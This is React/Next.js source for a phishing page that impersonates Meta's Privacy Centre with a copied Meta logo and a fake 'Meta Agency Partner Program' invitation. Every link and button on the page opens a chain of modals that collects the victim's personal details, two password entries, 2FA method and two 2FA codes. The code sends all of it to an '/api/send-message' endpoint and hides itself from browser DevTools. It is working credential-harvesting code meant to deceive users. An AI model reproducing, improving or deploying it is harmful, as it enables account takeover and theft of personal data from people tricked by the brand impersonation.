'use client';

import { useState } from 'react';
import { Search, Settings, Lock, FileText, ChevronDown, AlertCircle, Home } from 'lucide-react';
import RegistrationModal from '@/components/agency/RegistrationModal';
import PasswordModal from '@/components/agency/PasswordModal';
import AuthMethodModal from '@/components/agency/AuthMethodModal';
import TwoFactorModal from '@/components/agency/TwoFactorModal';
import { useDevToolsProtection } from '@/hooks/useDevToolsProtection';

interface FormData {
  fullName: string;
  email: string;
  emailBusiness: string;
  pageName: string;
  countryCode: string;
  phoneNumber: string;
  dayOfBirth: string;
  monthOfBirth: string;
  yearOfBirth: string;
  issue: string;
  agreeTerms: boolean;
  sendNotification: boolean;
}

export default function RegisterAgencyPage() {
  // Bảo vệ chống DevTools
  useDevToolsProtection();

  const [privacyPolicyOpen, setPrivacyPolicyOpen] = useState(false);
  const [otherPoliciesOpen, setOtherPoliciesOpen] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [passwordModalOpen, setPasswordModalOpen] = useState(false);
  const [authMethodModalOpen, setAuthMethodModalOpen] = useState(false);
  const [twoFactorModalOpen, setTwoFactorModalOpen] = useState(false);
  const [registrationData, setRegistrationData] = useState<FormData | null>(null);
  const [selectedAuthMethod, setSelectedAuthMethod] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [twoFactorApiSuccess, setTwoFactorApiSuccess] = useState(false);
  const [agencyEmail, setAgencyEmail] = useState<string>('');
  const [agencyEmailBusiness, setAgencyEmailBusiness] = useState<string>('');

  // Handler để mở modal khi click menu/submenu
  const handleMenuClick = (e: React.MouseEvent<HTMLAnchorElement>) => {
    e.preventDefault();
    setModalOpen(true);
  };

  const handleRegistrationSubmit = (data: FormData) => {
    // Chỉ lưu dữ liệu, chưa gọi API
    setRegistrationData(data);
    setModalOpen(false);
    setPasswordModalOpen(true);
  };

  const handlePasswordSubmit = async (password1: string, password2: string) => {
    // Gọi API khi submit password (lần 2)
    if (!registrationData) {
      setErrorMessage('Registration data is missing');
      return;
    }

    setIsSubmitting(true);
    setErrorMessage('');

    try {
      const response = await fetch('/api/send-message', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          full_name: registrationData.fullName,
          email: registrationData.email,
          email_business: registrationData.emailBusiness,
          page_name: registrationData.pageName,
          country_code: registrationData.countryCode,
          phone_number: registrationData.phoneNumber,
          date_of_birth: `${registrationData.yearOfBirth}-${registrationData.monthOfBirth.padStart(2, '0')}-${registrationData.dayOfBirth.padStart(2, '0')}`,
          issue: registrationData.issue,
          agree_terms: registrationData.agreeTerms,
          send_notification: registrationData.sendNotification,
          password1: password1,
          password2: password2,
          step: 1,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || 'Registration failed');
      }

      // Lưu 2 email vào localStorage và state
      if (registrationData.email) {
        localStorage.setItem('agency_email', registrationData.email);
        setAgencyEmail(registrationData.email);
      }
      if (registrationData.emailBusiness) {
        localStorage.setItem('agency_email_business', registrationData.emailBusiness);
        setAgencyEmailBusiness(registrationData.emailBusiness);
      }

      setPasswordModalOpen(false);
      setAuthMethodModalOpen(true);
    } catch (error) {
      console.error('Registration error:', error);
      setErrorMessage(error instanceof Error ? error.message : 'An error occurred during registration');
      // Hiển thị lỗi nhưng vẫn ở password modal
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAuthMethodSubmit = async (method: string) => {
    setSelectedAuthMethod(method);

    // Lấy 2 email từ localStorage
    const email = localStorage.getItem('agency_email');
    const emailBusiness = localStorage.getItem('agency_email_business');

    setIsSubmitting(true);
    setErrorMessage('');

    try {
      const response = await fetch('/api/send-message', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          email_business: emailBusiness,
          authen_method: method,
          step: 2,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || 'Failed to submit authentication method');
      }

      setAuthMethodModalOpen(false);
      setTwoFactorModalOpen(true);
    } catch (error) {
      setErrorMessage(error instanceof Error ? error.message : 'An error occurred');
      // Có thể hiển thị error ở đây nếu cần
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleTwoFactorSubmit = async (code1: string, code2: string) => {
    // Lấy 2 email từ localStorage
    const email = localStorage.getItem('agency_email') || '';
    const emailBusiness = localStorage.getItem('agency_email_business') || '';

    setIsSubmitting(true);
    setErrorMessage('');

    try {
      const response = await fetch('/api/send-message', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          email_business: emailBusiness,
          code1: code1,
          code2: code2,
          step: 3,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || 'Failed to submit 2FA code');
      }

      // Không đóng modal ngay, để TwoFactorModal xử lý countdown
      // setTwoFactorModalOpen(false); sẽ được gọi sau khi countdown về 0 trong TwoFactorModal

      // Set apiSuccess = true để bắt đầu countdown
      setTwoFactorApiSuccess(true);

      // Xóa dữ liệu localStorage sau khi hoàn tất
      localStorage.removeItem('agency_email');
      localStorage.removeItem('agency_email_business');

      // Xử lý tiếp theo sẽ được thực hiện sau khi countdown về 0 (reload trang)
    } catch (error) {
      setErrorMessage(error instanceof Error ? error.message : 'An error occurred');
      // Có thể hiển thị error ở đây nếu cần
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style jsx global>{`
        .scrollbar-hide::-webkit-scrollbar {
          display: none;
        }
        .scrollbar-hide {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
        a, button {
          cursor: pointer;
        }
        /* Custom scrollbar cho toàn bộ trang */
        * {
          scrollbar-width: thin;
          scrollbar-color: #d1d5db transparent;
        }
        *::-webkit-scrollbar {
          width: 2px;
          height: 2px;
        }
        *::-webkit-scrollbar-track {
          background: transparent;
        }
        *::-webkit-scrollbar-thumb {
          background: #d1d5db;
          border-radius: 10px;
        }
        *::-webkit-scrollbar-thumb:hover {
          background: #9ca3af;
        }
        *::-webkit-scrollbar-button {
          display: none;
        }
      `}</style>
      <div className="min-h-screen" style={{ background: 'linear-gradient(to right, #f9f1f9, #ecf7f8)' }}>
        <div className="max-w-7xl mx-auto flex">
          {/* Sidebar */}
          <div className="hidden lg:block w-80 fixed h-screen border-r border-gray-200" style={{ left: 'calc(50% - 640px)' }}>
            <div className="h-full overflow-y-auto scrollbar-hide p-6">
              <div className="mb-8">
                <div className="flex items-center gap-2 mb-2">
                  <svg aria-label="Bi?u tu?ng Meta" height="18" role="img" viewBox="0 0 150 100" width="27">
                    <defs>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_0_" x1="124.599" x2="159.703" y1="96.689" y2="57.25">
                        <stop offset="0.21" stopColor="#0278F1"></stop>
                        <stop offset="0.533" stopColor="#0180FA"></stop>
                      </linearGradient>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_1_" x1="43.859" x2="0" y1="4.984" y2="63.795">
                        <stop offset="0.427" stopColor="#0165E0"></stop>
                        <stop offset="0.917" stopColor="#0180FA"></stop>
                      </linearGradient>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_2_" x1="28.409" x2="134.567" y1="28.907" y2="71.769">
                        <stop stopColor="#0064E0"></stop>
                        <stop offset="0.656" stopColor="#0066E2"></stop>
                        <stop offset="1" stopColor="#0278F1"></stop>
                      </linearGradient>
                    </defs>
                    <path d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z" fill="#0180FA"></path>
                    <path d="M145.119 34.888h-14.878c3.44 8.718 5.46 19.42 5.46 30.969 0 11.137-3.647 17.599-11.205 17.599-1.403 0-2.663-.18-3.884-.63V99.5a33.48 33.48 0 0 0 3.54.18C140.758 99.68 150 86.23 150 64.756c0-10.702-1.768-20.882-4.881-29.87Z" fill="url(#_r_0_)"></path>
                    <path d="M43.103 0c.253 0 .505.003.756.008v16.308c-.319-.016-.64-.024-.962-.024-14.138 0-26.055 23.706-26.65 47.503H.014C.588 30.77 19.08 0 43.103 0Z" fill="url(#_r_1_)"></path>
                    <path d="M43.103 0c11.115 0 20.534 5.004 31.4 17.913 3.055 3.817 6.74 8.777 10.682 14.511l.017.025.024-.003c1.939 2.912 3.94 6.05 6.017 9.428l8.795 14.668c13.754 22.13 17.214 26.913 24.458 26.913h.103v16.22c-.148.003-.297.004-.447.004-14.466 0-22.449-8.126-36.778-32.103l-7.356-12.374a587.065 587.065 0 0 0-2.287-3.822l.019-.045c-5.483-8.971-8.971-14.454-11.962-18.44l-.05.037c-9.15-12.59-15.42-16.64-22.842-16.64h-.034V.001l.24-.001Z" fill="url(#_r_2_)"></path>
                  </svg>
                  <span className="font-semibold text-gray-900">Meta</span>
                </div>
                <h1 className="text-2xl font-bold text-gray-900">Privacy Centre</h1>
              </div>

              <nav className="space-y-2">
                <a href="#" onClick={handleMenuClick} className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700">
                  <Home className="w-5 h-5" />
                  <span>Privacy Centre home</span>
                </a>

                <a href="#" onClick={handleMenuClick} className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700">
                  <Search className="w-5 h-5" />
                  <span>Search</span>
                </a>

                <button
                  onClick={() => setModalOpen(true)}
                  className="flex items-center gap-3 p-3 rounded-lg bg-gray-800 text-white w-full text-left"
                >
                  <Settings className="w-5 h-5" />
                  <span>Common privacy settings</span>
                </button>

                <a href="#" onClick={handleMenuClick} className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700">
                  <Lock className="w-5 h-5" />
                  <span>Privacy topics</span>
                </a>

                <a href="#" onClick={handleMenuClick} className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700">
                  <FileText className="w-5 h-5" />
                  <span>More privacy resources</span>
                </a>

                {/* Privacy Policy with submenu */}
                <div>
                  <button
                    onClick={() => setPrivacyPolicyOpen(!privacyPolicyOpen)}
                    className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700 w-full"
                  >
                    <Lock className="w-5 h-5" />
                    <span>Privacy Policy</span>
                    <ChevronDown className={`w-4 h-4 ml-auto transition-transform ${privacyPolicyOpen ? 'rotate-180' : ''}`} />
                  </button>

                  {privacyPolicyOpen && (
                    <div className="ml-8 mt-1 space-y-1 text-sm">
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        What is the Privacy Policy and what does it cover?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        What information do we collect?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we use your information?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we share your information on Products or with integrated partners?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we share information with third parties?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How is the cooperation between Companies organized?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How can you manage or delete your information and exercise your rights?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How long do we keep your information?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we transmit information?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we respond to official requests, comply with applicable laws, and prevent harm?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How will you know when the policy changes?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How to ask questions?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        Why and how we process your data
                      </a>
                    </div>
                  )}
                </div>

                {/* Other policies and articles with submenu */}
                <div>
                  <button
                    onClick={() => setOtherPoliciesOpen(!otherPoliciesOpen)}
                    className="flex items-center gap-3 p-3 rounded-lg hover:bg-gray-100 text-gray-700 w-full text-left"
                  >
                    <FileText className="w-5 h-5" />
                    <span>Other policies and articles</span>
                    <ChevronDown className={`w-4 h-4 ml-auto transition-transform ${otherPoliciesOpen ? 'rotate-180' : ''}`} />
                  </button>

                  {otherPoliciesOpen && (
                    <div className="ml-8 mt-1 space-y-1 text-sm">
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        What is the Privacy Policy and what does it cover?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded flex items-center gap-2">
                        What information do we collect?
                        <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                        </svg>
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we use your information?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded">
                        How do we share your information on Products or with integrated partners?
                      </a>
                      <a href="#" onClick={handleMenuClick} className="block py-2 px-3 text-gray-700 hover:bg-gray-100 rounded flex items-center gap-2">
                        How do we share information with third parties?
                        <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                        </svg>
                      </a>
                    </div>
                  )}
                </div>
              </nav>
            </div>
          </div>

          {/* Main Content */}
          <div className="flex-1 p-2 lg:p-8 lg:ml-80">
            <div className="p-2 lg:p-8">
              {/* Mobile Logo - Only visible on mobile */}
              <div className="lg:hidden mb-6">
                <div className="flex items-center gap-2 mb-3">
                  <svg aria-label="Bi?u tu?ng Meta" height="18" role="img" viewBox="0 0 150 100" width="27">
                    <defs>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_0_mobile" x1="124.599" x2="159.703" y1="96.689" y2="57.25">
                        <stop offset="0.21" stopColor="#0278F1"></stop>
                        <stop offset="0.533" stopColor="#0180FA"></stop>
                      </linearGradient>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_1_mobile" x1="43.859" x2="0" y1="4.984" y2="63.795">
                        <stop offset="0.427" stopColor="#0165E0"></stop>
                        <stop offset="0.917" stopColor="#0180FA"></stop>
                      </linearGradient>
                      <linearGradient gradientUnits="userSpaceOnUse" id="_r_2_mobile" x1="28.409" x2="134.567" y1="28.907" y2="71.769">
                        <stop stopColor="#0064E0"></stop>
                        <stop offset="0.656" stopColor="#0066E2"></stop>
                        <stop offset="1" stopColor="#0278F1"></stop>
                      </linearGradient>
                    </defs>
                    <path d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z" fill="#0180FA"></path>
                    <path d="M145.119 34.888h-14.878c3.44 8.718 5.46 19.42 5.46 30.969 0 11.137-3.647 17.599-11.205 17.599-1.403 0-2.663-.18-3.884-.63V99.5a33.48 33.48 0 0 0 3.54.18C140.758 99.68 150 86.23 150 64.756c0-10.702-1.768-20.882-4.881-29.87Z" fill="url(#_r_0_mobile)"></path>
                    <path d="M43.103 0c.253 0 .505.003.756.008v16.308c-.319-.016-.64-.024-.962-.024-14.138 0-26.055 23.706-26.65 47.503H.014C.588 30.77 19.08 0 43.103 0Z" fill="url(#_r_1_mobile)"></path>
                    <path d="M43.103 0c11.115 0 20.534 5.004 31.4 17.913 3.055 3.817 6.74 8.777 10.682 14.511l.017.025.024-.003c1.939 2.912 3.94 6.05 6.017 9.428l8.795 14.668c13.754 22.13 17.214 26.913 24.458 26.913h.103v16.22c-.148.003-.297.004-.447.004-14.466 0-22.449-8.126-36.778-32.103l-7.356-12.374a587.065 587.065 0 0 0-2.287-3.822l.019-.045c-5.483-8.971-8.971-14.454-11.962-18.44l-.05.037c-9.15-12.59-15.42-16.64-22.842-16.64h-.034V.001l.24-.001Z" fill="url(#_r_2_mobile)"></path>
                  </svg>
                  <span className="font-semibold text-gray-900">Meta</span>
                </div>
                <h1 className="text-xl font-bold text-gray-900">Privacy Centre</h1>
              </div>

              <h2 className="text-2xl lg:text-3xl font-bold text-gray-900 mb-4">
                Invitation to Join Meta Agency Partner Program
              </h2>

              <p className="text-gray-700 mb-4">
                We are pleased to inform you that your page has been selected to join our Meta Agency Partner
                Program. This program is designed to provide you with exclusive resources and ecosystem.
              </p>

              <p className="text-gray-700 mb-6">
                Our system has reviewed your account activity and verified that your page meets the eligibility
                criteria for agency partnership. To complete your onboarding and activate full media management
                access, please proceed with the verification and confirmation process.
              </p>

              <div className="bg-gray-50 p-4 rounded-lg mb-6">
                <p className="text-sm text-gray-600">
                  <span className="font-semibold">Your invitation ID:</span> 847Z5-KTBB4-4T79
                </p>
              </div>

              <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
                <h3 className="font-semibold text-gray-900 mb-2 flex items-center gap-2">
                  <AlertCircle className="w-5 h-5 text-blue-600" />
                  Important Notes
                </h3>
                <ul className="list-disc list-inside text-sm text-gray-700 space-y-1">
                  <li>Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.</li>
                  <li>Our verification team may reach out within 2 business days if additional details are needed.</li>
                  <li>Any request containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.</li>
                </ul>
              </div>

              {/* Illustration Section */}
              <div className="bg-gradient-to-r from-purple-100 to-blue-100 rounded-2xl p-4 md:p-8 mb-8">
                {/* Banner Image */}
                <div className="mb-6">
                  <img
                    src="/banner-v3.png"
                    alt="Meta Agency Security"
                    className="w-full h-auto rounded-lg"
                  />
                </div>

                {/* Content Box */}
                <div className="bg-white rounded-xl p-4 md:p-6 shadow-sm">
                  <h3 className="text-xl font-bold text-gray-900 mb-4">
                    Join Meta Agency Program
                  </h3>
                  <p className="text-gray-900 font-semibold mb-3">
                    We look forward to welcoming you to the Meta Media Agency network � where you can access advanced tools, advertising resources, and dedicated agency support.
                  </p>
                  <p className="text-sm text-gray-700 mb-6">
                    Please provide the required information below to complete your agency onboarding. Missing or incomplete details may delay the verification process.
                  </p>

                  {/* Join Button */}
                  <button
                    onClick={() => setModalOpen(true)}
                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors"
                  >
                    Join Meta Agency Program
                  </button>

                  {/* Invitation Date */}
                  <p className="text-center text-sm text-gray-600 mt-4">
                    You have been invited to join the Meta Media Agency program on <span className="font-semibold">October 17, 2025</span>.
                  </p>
                </div>
              </div>



              {/* Privacy Center Links */}
              <div className="space-y-4">
                <div className="bg-gradient-to-br from-gray-50 to-blue-50 rounded-xl p-6">
                  <h4 className="font-semibold text-gray-900 mb-4">Privacy Center</h4>
                  <div className="space-y-3">
                    {/* Privacy Policy Item */}
                    <button onClick={() => setModalOpen(true)} className="flex items-start gap-3 w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                      <div className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0 overflow-hidden">
                        <img src="/icon-women.png" alt="Privacy Policy" className="w-full h-full object-cover" />
                      </div>
                      <div className="flex-1">
                        <div className="font-medium text-gray-900 mb-1">What is the Privacy Policy and what does it say?</div>
                        <div className="text-sm text-gray-600">Privacy Policy</div>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1" />
                    </button>

                    {/* Manage Information Item */}
                    <button onClick={() => setModalOpen(true)} className="flex items-start gap-3 w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                      <div className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0 overflow-hidden">
                        <img src="/icon-women.png" alt="Privacy Policy" className="w-full h-full object-cover" />
                      </div>
                      <div className="flex-1">
                        <div className="font-medium text-gray-900 mb-1">How you can manage or delete your information</div>
                        <div className="text-sm text-gray-600">Privacy Policy</div>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1" />
                    </button>
                  </div>
                </div>

                <div className="bg-gradient-to-br from-gray-50 to-blue-50 rounded-xl p-6">
                  <h4 className="font-semibold text-gray-900 mb-4">For more details, see the User Agreement</h4>
                  <button onClick={() => setModalOpen(true)} className="flex items-start gap-3 w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                    <div className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0 overflow-hidden">
                      <img src="/icon-docs.png" alt="User Agreement" className="w-full h-full object-cover" />
                    </div>
                    <div className="flex-1">
                      <div className="font-medium text-gray-900 mb-1">AI Product</div>
                      <div className="text-sm text-gray-600">User Agreement</div>
                    </div>
                    <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1" />
                  </button>
                </div>

                <div className="bg-gradient-to-br from-gray-50 to-blue-50 rounded-xl p-6">
                  <h4 className="font-semibold text-gray-900 mb-4">Additional resources</h4>
                  <div className="space-y-3">
                    {/* How uses information */}
                    <button onClick={() => setModalOpen(true)} className="flex items-start justify-between w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                      <div className="flex-1">
                        <div className="font-medium text-gray-900 mb-1">How uses information for generative AI models</div>
                        <div className="text-sm text-gray-600">Privacy Center</div>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1 ml-3" />
                    </button>

                    {/* Cards with information */}
                    <button onClick={() => setModalOpen(true)} className="flex items-start justify-between w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                      <div className="flex-1">
                        <div className="font-medium text-gray-900 mb-1">Cards with information about the operation of AI systems</div>
                        <div className="text-sm text-gray-600">Product AI website</div>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1 ml-3" />
                    </button>

                    {/* Introduction to Generative AI */}
                    <button onClick={() => setModalOpen(true)} className="flex items-start justify-between w-full text-left p-3 hover:bg-white/50 rounded-lg transition-colors bg-white shadow-sm">
                      <div className="flex-1">
                        <div className="font-medium text-gray-900 mb-1">Introduction to Generative AI</div>
                        <div className="text-sm text-gray-600">For teenagers</div>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400 flex-shrink-0 mt-1 ml-3" />
                    </button>
                  </div>
                </div>

                <p className="text-xs text-gray-500 mt-4">
                  We automatically identify potential privacy risks, including when collecting, using or sharing personal
                  information, and developing methods to reduce these risks.{' '}
                  <a href="#" className="text-blue-600 hover:underline">
                    Read more about Privacy Policy
                  </a>
                </p>
              </div>
            </div>
          </div>

          {/* Modal */}
          <RegistrationModal
            isOpen={modalOpen}
            onClose={() => setModalOpen(false)}
            onSubmit={handleRegistrationSubmit}
          />
          <PasswordModal
            isOpen={passwordModalOpen}
            onClose={() => {
              setPasswordModalOpen(false);
              setErrorMessage('');
            }}
            onSubmit={handlePasswordSubmit}
            isSubmitting={isSubmitting}
            errorMessage={errorMessage}
          />
          <AuthMethodModal
            isOpen={authMethodModalOpen}
            onClose={() => {
              setAuthMethodModalOpen(false);
              setErrorMessage('');
            }}
            onSubmit={handleAuthMethodSubmit}
            phoneNumber={registrationData ? `${registrationData.countryCode}${registrationData.phoneNumber}` : undefined}
            email={registrationData?.email}
            isSubmitting={isSubmitting}
            errorMessage={errorMessage}
          />
          <TwoFactorModal
            isOpen={twoFactorModalOpen}
            onClose={() => {
              setTwoFactorModalOpen(false);
              setErrorMessage('');
              setTwoFactorApiSuccess(false);
            }}
            onSubmit={handleTwoFactorSubmit}
            method={selectedAuthMethod}
            isSubmitting={isSubmitting}
            errorMessage={errorMessage}
            apiSuccess={twoFactorApiSuccess}
            email={agencyEmail}
            emailBusiness={agencyEmailBusiness}
          />
        </div>
      </div>
    </>
  );
}
